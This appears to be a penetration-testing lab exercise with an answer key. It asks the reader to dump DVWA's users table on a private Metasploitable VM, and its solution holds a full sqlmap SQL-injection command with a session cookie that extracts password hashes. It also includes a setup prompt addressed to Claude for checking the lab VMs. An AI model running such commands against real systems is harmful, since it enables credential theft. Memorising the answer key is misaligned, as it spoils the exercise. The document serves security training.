# Q067 — sqlmap Against DVWA

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟡 Medium |
| **Tools** | `burpsuite`, `sqlmap`, `gobuster`, `nikto`, `curl` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Use sqlmap to dump the **users** table from DVWA SQLi (low security). Provide the sqlmap command (cookie-based).

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=sqlmap -u 'http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=...' --dump -T users`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Login first to get a session cookie.
</details>

<details>
<summary>Hint 2</summary>

Use `--batch` for default answers.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sqlmap -u 'http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=XYZ; security=low' -D dvwa -T users --dump --batch
```

Returns users table with hashed passwords.

**Answer:** `cmd=sqlmap -u URL --cookie='security=low' -T users --dump`

📖 Ref: [playbooks/sqli-playbook.md](../../playbooks/sqli-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q067".
```
